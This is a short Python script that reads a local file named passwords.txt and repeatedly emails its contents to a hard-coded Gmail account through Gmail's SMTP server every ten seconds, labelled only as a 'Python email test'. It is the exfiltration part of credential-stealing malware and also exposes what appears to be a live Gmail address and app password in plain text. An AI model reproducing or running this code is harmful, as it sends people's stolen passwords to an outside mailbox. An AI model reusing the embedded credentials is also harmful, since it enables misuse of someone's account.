
import smtplib
import time
import socket
import os

def sendMail():
    sender = "bulamabenjamin101@gmail.com"
    receiver = "bulamabenjamin101@gmail.com"
    password = "otaq oxlo rgwp oqsr"
    subject = "Python email test"

    with open("passwords.txt") as file:
        body = file.read()


    # header
    message = f"""From: <{sender}>
To: <{receiver}>
Subject: {subject}\n
{body}
    """

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender, password)
        print("Logged in...")
        server.sendmail(sender, receiver, message)
        print("Email has been sent!")

    except smtplib.SMTPAuthenticationError:
        print("Unable to sign in: Authentication error.")
    
    except socket.gaierror:
        print("Unable to connect: Network error.")

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        try:
            server.quit()
        except:
            pass

while True:
    sendMail()
    print("Cooling down...")
    time.sleep(10)
    print("Active!")
    time.sleep(1)




